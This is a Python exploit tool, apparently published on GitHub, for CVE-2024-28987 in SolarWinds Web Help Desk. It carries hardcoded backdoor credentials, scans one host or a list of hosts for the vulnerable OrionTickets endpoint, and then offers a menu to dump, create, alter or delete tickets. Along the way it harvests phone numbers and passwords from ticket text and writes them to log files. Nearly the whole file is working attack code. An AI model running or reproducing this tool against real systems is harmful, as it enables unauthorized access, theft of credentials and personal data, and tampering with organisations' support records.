#!/usr/bin/python3
import sys
import argparse
import requests
import urllib3
import logging
import json
import os
import pydoc
import re
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

urllib3.disable_warnings()

# ANSI color codes for styling the terminal output
RESET = "\033[0m"
RED = "\033[91m"
GREEN = "\033[92m"
BOLD = "\033[1m"
CYAN = "\033[96m"
YELLOW = "\033[93m"

# Constants for the hardcoded credentials
AUTH_HEADER = {
    'Authorization': 'Basic aGVscGRlc2tJbnRlZ3JhdGlvblVzZXI6ZGV2LUM0RjgwMjVFNw==',  # helpdeskIntegrationUser:dev-C4F8025E7
    'Content-Type': 'application/x-www-form-urlencoded'
}

# Banner for the script (use raw string to avoid escape sequences issues)
BANNER = r"""
  ___  _  _  ____     ___   ___  ___   __       ___   ___  ___  ___  ___ 
 / __)( \/ )( ___)___(__ \ / _ \(__ \ /. |  ___(__ \ ( _ )/ _ \( _ )(__ )
( (__  \  /  )__)(___)/ _/( (_) )/ _/(_  _)(___)/ _/ / _ \\_  // _ \ / / 
 \___)  \/  (____)   (____)\___/(____) (_)     (____)\___/ (_/ \___/(_/  

  | Scanner & Exploiter - SolarWinds Web Help Desk | 
 _________________________________________________________________
 | By PlayerFridei   | https://github.com/PlayerFridei            |
 |                   |                                            |
 | and               |                                            |
 |                   |                                            |
 | Havok             | https://github.com/havokzero               |
 -----------------------------------------------------------------
"""

# Setup logging for the script
logging.basicConfig(
    level=logging.INFO,
    format=f'%(asctime)s - {GREEN}%(levelname)s{RESET} - %(message)s',
    handlers=[
        logging.FileHandler('exploit.log'),
        logging.StreamHandler()
    ]
)

# Setting a 3GB limit for response and log file size
max_response_size = 3 * 1024 * 1024 * 1024  # 3GB limit for response size
max_log_size = 3 * 1024 * 1024 * 1024  # 3GB limit for log file size

def clear_terminal():
    """
    Clear the terminal screen for better presentation.
    """
    os.system('cls' if os.name == 'nt' else 'clear')

def setup_session():
    """
    Set up an HTTP session with retries for handling failures, limited to 3 retries.
    """
    session = requests.Session()
    retries = Retry(total=3, backoff_factor=1, status_forcelist=[500, 502, 503, 504])
    adapter = HTTPAdapter(max_retries=retries)
    session.mount('http://', adapter)
    session.mount('https://', adapter)
    return session

def get_basic_auth_headers():
    """
    Return the authentication headers with hardcoded credentials.
    """
    return AUTH_HEADER

def sanitize_filename(filename):
    """
    Sanitize filenames to prevent path traversal and ensure valid naming.
    """
    return re.sub(r'[^a-zA-Z0-9._-]', '_', filename)

def sanitize_terminal_output(text):
    """
    Strip out escape sequences and control characters to prevent terminal manipulation.
    """
    return re.sub(r'\x1B[@-_][0-?]*[ -/]*[@-~]', '', text)

def check_vulnerable_endpoint(ip: str, session):
    """
    Test both HTTP and HTTPS for the /OrionTickets endpoint.
    """
    vulnerable_scheme = None

    for scheme in ['http', 'https']:
        base_url = f"{scheme}://{ip}"
        endpoint = f"{base_url}/helpdesk/WebObjects/Helpdesk.woa/ra/OrionTickets/"

        try:
            logging.info(f"{BOLD}{CYAN}[*] Testing {scheme.upper()} on {endpoint}{RESET}")
            response = session.get(endpoint, headers=get_basic_auth_headers(), timeout=10, verify=False)

            if response.status_code == 200 and 'displayClient' in response.text and 'shortDetail' in response.text:
                logging.info(f"{GREEN}[+] {scheme.upper()} scheme is vulnerable at {endpoint}{RESET}")
                vulnerable_scheme = base_url
                break  # Stop checking once a vulnerable scheme is found
            else:
                logging.warning(f"{RED}[-] {scheme.upper()} does not seem to be vulnerable.{RESET}")

        except requests.exceptions.SSLError as ssl_err:
            logging.error(f"{RED}[-] SSL error with {scheme.upper()}: {ssl_err}.{RESET}")
        except requests.exceptions.RequestException as e:
            logging.error(f"{RED}[-] An error occurred with {scheme.upper()}: {e}{RESET}")
            continue

    if vulnerable_scheme:
        return vulnerable_scheme
    else:
        logging.error(f"{RED}[-] Unable to confirm vulnerability on both HTTP and HTTPS.{RESET}")
        return None

def save_tickets_to_log(ip: str, tickets):
    """
    Save tickets to a log file named after the IP address.
    """
    log_filename = sanitize_filename(f"{ip}_ticket_log.txt")

    with open(log_filename, 'w') as file:
        for ticket in tickets:
            # Check file size to prevent overflows
            if os.path.getsize(log_filename) >= max_log_size:
                logging.error(f"{RED}[!] Log file size exceeded limit. Stopping log writing to {log_filename}.{RESET}")
                break
            
            file.write(f"Ticket ID: {ticket.get('id')}\n")
            file.write(f"Client: {sanitize_terminal_output(ticket.get('displayClient'))}\n")
            file.write(f"Subject: {sanitize_terminal_output(ticket.get('shortSubject'))}\n")
            file.write(f"Detail: {sanitize_terminal_output(ticket.get('shortDetail'))}\n")
            file.write(f"Last Updated: {ticket.get('prettyLastUpdated')}\n")
            file.write("-" * 40 + "\n")
    logging.info(f"{GREEN}[+] Tickets saved to {log_filename}{RESET}")

def print_tickets_pretty(tickets):
    """
    Print tickets in a human-readable format.
    """
    for ticket in tickets:
        print(f"{BOLD}Ticket ID:{RESET} {ticket.get('id')}")
        print(f"{BOLD}Client:{RESET} {sanitize_terminal_output(ticket.get('displayClient'))}")
        print(f"{BOLD}Subject:{RESET} {sanitize_terminal_output(ticket.get('shortSubject'))}")
        print(f"{BOLD}Detail:{RESET} {sanitize_terminal_output(ticket.get('shortDetail'))}")
        print(f"{BOLD}Last Updated:{RESET} {ticket.get('prettyLastUpdated')}")
        print("-" * 40)

def fetch_tickets(base_url: str, session, ip: str):
    """
    Fetch the list of tickets from the vulnerable WHD endpoint and save to a log file.
    Also extract phone numbers and passwords from ticket details and display them.
    """
    logging.info(f'{CYAN}[*] Attempting to retrieve all tickets from {base_url}...{RESET}')

    headers = get_basic_auth_headers()
    try:
        response = session.get(
            f'{base_url}/helpdesk/WebObjects/Helpdesk.woa/ra/OrionTickets',
            headers=headers,
            verify=False,
            timeout=30
        )

        # Log the response headers
        logging.info(f"{YELLOW}[+] Response Headers:{RESET}")
        for header, value in response.headers.items():
            logging.info(f"{YELLOW}{header}: {value}{RESET}")

        # Validate response size
        if len(response.content) > max_response_size:
            logging.error(f"{RED}[!] Response size is too large. Possible hostile honeypot detected.{RESET}")
            return

        if response.status_code == 200 and 'shortSubject' in response.text:
            logging.info(f'{GREEN}[+] Successfully retrieved helpdesk tickets.{RESET}')
            try:
                tickets = response.json()
            except json.JSONDecodeError:
                logging.error(f"{RED}[-] Failed to parse JSON. The response may be malformed.{RESET}")
                return

            # Print and analyze tickets
            for ticket in tickets:
                print_tickets_pretty([ticket])
                extract_sensitive_info(ticket.get('shortDetail', ''))

            # Save tickets to a log file named after the IP address
            save_tickets_to_log(ip, tickets)
        else:
            logging.warning(f'{RED}[-] Failed to retrieve tickets. Status Code: {response.status_code}{RESET}')
    except requests.exceptions.RequestException as e:
        logging.error(f'{RED}[-] An error occurred during request: {e}{RESET}')

def extract_sensitive_info(detail: str):
    """
    Extract phone numbers and passwords from the ticket detail using regex.
    """
    # Regex for matching phone numbers
    phone_regex = re.compile(
        r"((^(\+?1)?)|\b1?)\D?\(?([2-9]{1}[0-9]{2})\)?\D?([1-9]{1}[0-9]{2})\D?([0-9]{4})(?![-‚óè\d])"
    )

    # Regex for matching possible passwords (basic heuristic)
    password_regex = re.compile(
        r"(?:(?:password|pwd|pass|secret)\s*[:=]\s*['\"]?([^\s'\";]{6,})['\"]?)", 
        re.IGNORECASE
    )

    # Find all phone numbers
    phone_matches = phone_regex.findall(detail)
    if phone_matches:
        logging.info(f"{YELLOW}[+] Extracted Phone Numbers:{RESET}")
        for match in phone_matches:
            phone_number = ''.join(match[-3:])  # Last three groups form the number
            logging.info(f"{GREEN}[Phone]{RESET}: {phone_number}")
    else:
        logging.info(f"{YELLOW}[-] No phone numbers found in the ticket detail.{RESET}")

    # Find possible passwords
    password_matches = password_regex.findall(detail)
    if password_matches:
        logging.info(f"{YELLOW}[+] Extracted Passwords:{RESET}")
        for password in password_matches:
            logging.info(f"{GREEN}[Password]{RESET}: {password}")
    else:
        logging.info(f"{YELLOW}[-] No passwords found in the ticket detail.{RESET}")

def user_menu(base_url: str, session, ip: str):
    """
    Menu for selecting the desired action to perform (fetch, create, update, delete tickets).
    """
    while True:
        print("\nChoose an option:")
        print(f"{CYAN}1.{RESET} Fetch all tickets")
        print(f"{CYAN}2.{RESET} Create a new ticket")
        print(f"{CYAN}3.{RESET} Update an existing ticket")
        print(f"{CYAN}4.{RESET} Delete a ticket")
        print(f"{CYAN}5.{RESET} Exit")

        choice = input("[?] Enter your choice (1-5): ")

        if choice == "1":
            fetch_tickets(base_url, session, ip)
        elif choice == "2":
            create_ticket(base_url, session)
        elif choice == "3":
            update_ticket(base_url, session)
        elif choice == "4":
            delete_ticket(base_url, session)
        elif choice == "5":
            logging.info(f"{CYAN}[*] Exiting the program.{RESET}")
            break
        else:
            logging.warning(f"{RED}[-] Invalid choice. Please choose a valid option.{RESET}")

def scan_targets_from_file(file_path, session):
    """
    Scan multiple targets listed in a file.
    """
    try:
        with open(file_path, 'r') as file:
            targets = file.readlines()
            if not targets:
                logging.warning(f"{RED}[!] No targets found in the file.{RESET}")
                return

            # Loop through each target in the file
            for target in targets:
                target = target.strip()
                if target:
                    logging.info(f"{CYAN}[*] Scanning target: {target}{RESET}")
                    base_url = check_vulnerable_endpoint(target, session)
                    if base_url:
                        proceed = input(
                            f"{CYAN}[?] Target {target} is vulnerable. Proceed with exploitation? (y/n): {RESET}").strip().lower()
                        if proceed == 'y':
                            user_menu(base_url, session, target)
                        else:
                            logging.info(f"{CYAN}[*] Skipping exploitation for target {target}.{RESET}")
                    else:
                        logging.warning(f"{RED}[-] Target {target} is not vulnerable or not reachable.{RESET}")
    except FileNotFoundError:
        logging.error(f"{RED}[!] The file {file_path} was not found.{RESET}")
    except Exception as e:
        logging.error(f"{RED}[!] An error occurred: {e}{RESET}")

def create_ticket(base_url: str, session):
    """
    Create a new ticket on the vulnerable WHD instance.
    """
    logging.info(f'{CYAN}[*] Attempting to create a new ticket on {base_url}...{RESET}')

    headers = get_basic_auth_headers()
    subject = input("[?] Enter the ticket subject: ")
    detail = input("[?] Enter the ticket detail: ")

    payload = {
        "shortSubject": subject,
        "shortDetail": detail,
    }

    endpoint = f'{base_url}/helpdesk/WebObjects/Helpdesk.woa/ra/OrionTickets'

    try:
        # Sending POST request to create ticket
        response = session.post(endpoint, headers=headers, json=payload, verify=False, timeout=30)

        # Log the response status code and body for further inspection
        logging.info(f"{YELLOW}[+] Response Status Code: {response.status_code}{RESET}")
        logging.info(f"{YELLOW}[+] Response Body: {response.text}{RESET}")

        # Handling the response
        if response.status_code == 201:
            logging.info(f'{GREEN}[+] Successfully created a new ticket with subject: "{subject}"{RESET}')
            print(json.dumps(response.json(), indent=4, sort_keys=True))
        elif response.status_code == 400:
            logging.warning(f'{RED}[-] Bad request. Please check the input data and try again.{RESET}')
        else:
            logging.warning(f'{RED}[-] Failed to create ticket. Status Code: {response.status_code}{RESET}')
    except requests.exceptions.RequestException as e:
        logging.error(f'{RED}[-] An error occurred during ticket creation: {e}{RESET}')

def update_ticket(base_url: str, session):
    """
    Update an existing ticket on the vulnerable WHD instance.
    """
    logging.info(f'{CYAN}[*] Attempting to update a ticket on {base_url}...{RESET}')

    headers = get_basic_auth_headers()
    ticket_id = input("[?] Enter the ticket ID to update: ")
    new_subject = input("[?] Enter the new ticket subject: ")
    new_detail = input("[?] Enter the new ticket detail: ")

    payload = {
        "shortSubject": new_subject,
        "shortDetail": new_detail,
    }

    endpoint = f'{base_url}/helpdesk/WebObjects/Helpdesk.woa/ra/OrionTickets/{ticket_id}'

    try:
        # Sending PUT request to update ticket
        response = session.put(endpoint, headers=headers, json=payload, verify=False, timeout=30)

        # Log the response status code and body for further inspection
        logging.info(f"{YELLOW}[+] Response Status Code: {response.status_code}{RESET}")
        logging.info(f"{YELLOW}[+] Response Body: {response.text}{RESET}")

        # Handling the response
        if response.status_code == 200:
            logging.info(f'{GREEN}[+] Successfully updated ticket ID {ticket_id}.{RESET}')
        elif response.status_code == 404:
            logging.warning(f'{RED}[-] Ticket ID {ticket_id} not found.{RESET}')
        else:
            logging.warning(f'{RED}[-] Failed to update ticket ID {ticket_id}. Status Code: {response.status_code}{RESET}')
    except requests.exceptions.RequestException as e:
        logging.error(f'{RED}[-] An error occurred during ticket update: {e}{RESET}')

def delete_ticket(base_url: str, session):
    """
    Delete an existing ticket on the vulnerable WHD instance.
    """
    logging.info(f'{CYAN}[*] Attempting to delete a ticket on {base_url}...{RESET}')

    headers = get_basic_auth_headers()
    ticket_id = input("[?] Enter the ticket ID to delete: ")

    endpoint = f"{base_url}/helpdesk/WebObjects/Helpdesk.woa/ra/OrionTickets/{ticket_id}"

    try:
        # Sending DELETE request
        response = session.delete(endpoint, headers=headers, verify=False, timeout=30)

        # Log the response status code and body for further inspection
        logging.info(f"{YELLOW}[+] Response Status Code: {response.status_code}{RESET}")
        logging.info(f"{YELLOW}[+] Response Body: {response.text}{RESET}")

        # Handling the response
        if response.status_code == 204:
            logging.info(f'{GREEN}[+] Successfully deleted ticket ID {ticket_id}.{RESET}')
        elif response.status_code == 200:
            logging.info(f'{GREEN}[+] Ticket ID {ticket_id} was deleted (Status Code 200). However, review response for validation.{RESET}')
        elif response.status_code == 404:
            logging.warning(f'{RED}[-] Ticket ID {ticket_id} not found.{RESET}')
        else:
            logging.warning(f'{RED}[-] Failed to delete ticket ID {ticket_id}. Status Code: {response.status_code}{RESET}')
    except requests.exceptions.RequestException as e:
        logging.error(f'{RED}[-] An error occurred during ticket deletion: {e}{RESET}')

def main():
    parser = argparse.ArgumentParser(description="CVE-2024-28987 Scanner & Exploiter - SolarWinds Web Help Desk")
    parser.add_argument('ip', type=str, nargs='?', help='Target IP (e.g., 123.123.123.123)', default=None)
    parser.add_argument('-f', '--file', type=str, help='File containing list of targets')

    args = parser.parse_args()

    # Clear terminal and display banner
    clear_terminal()
    print(f"{BOLD}{CYAN}{BANNER}{RESET}")

    if args.file:
        # Scan multiple targets from a file
        session = setup_session()  # Setup session here to prevent redundancy
        scan_targets_from_file(args.file, session)
    elif args.ip:
        # Single target scan
        session = setup_session()
        base_url = check_vulnerable_endpoint(args.ip, session)
        if base_url:
            proceed = input(f"{CYAN}[?] The target is vulnerable. Would you like to proceed with exploitation? (y/n): {RESET}").strip().lower()
            if proceed == 'y':
                user_menu(base_url, session, args.ip)
            else:
                logging.info(f"{CYAN}[*] Exiting. No further action will be taken.{RESET}")
        else:
            logging.warning(f"{RED}[-] Target is not vulnerable or not reachable. Exiting.{RESET}")
    else:
        # No IP or file provided
        logging.error(f"{RED}[!] You must provide either a target IP address or a file with targets.{RESET}")
        parser.print_help()
        sys.exit(1)  # Exit with an error code to indicate failure

if __name__ == "__main__":
    main()
